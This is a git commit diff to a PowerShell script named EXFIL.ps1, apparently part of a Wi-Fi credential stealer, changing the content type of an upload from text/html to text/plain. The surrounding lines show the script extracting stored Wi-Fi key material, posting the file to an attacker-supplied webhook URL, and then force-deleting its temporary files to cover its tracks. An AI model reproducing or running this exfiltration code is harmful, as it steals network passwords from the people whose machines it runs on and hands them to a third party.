9e04d68e6d6d75dae411479d39608f261b4bb878
Predator3790 <104280655+Predator3790@users.noreply.github.com>
2023-06-26 17:53:19 -0600

    Changed -ContentType to text/plain

--- src/EXFIL.ps1
+++ src/EXFIL.ps1
@@ -19,7 +19,7 @@ Select-String -Pattern '<keyMaterial>(.*)</keyMaterial>' -Path $TempPath\*Wi-Fi*
 
 # Send temporary file through web request
 # Do not change 'WEBHOOK_URL_HERE' (./src/modify_scripts.py will need it)
-Invoke-WebRequest -Uri 'WEBHOOK_URL_HERE' -UseBasicParsing -Method Post -ContentType 'text/html; charset=utf-8' -InFile $TempFile
+Invoke-WebRequest -Uri 'WEBHOOK_URL_HERE' -UseBasicParsing -Method Post -ContentType 'text/plain; charset=utf-8' -InFile $TempFile
 
 # Delete every directory and file created
 Remove-Item -Path $TempPath -Recurse -Force
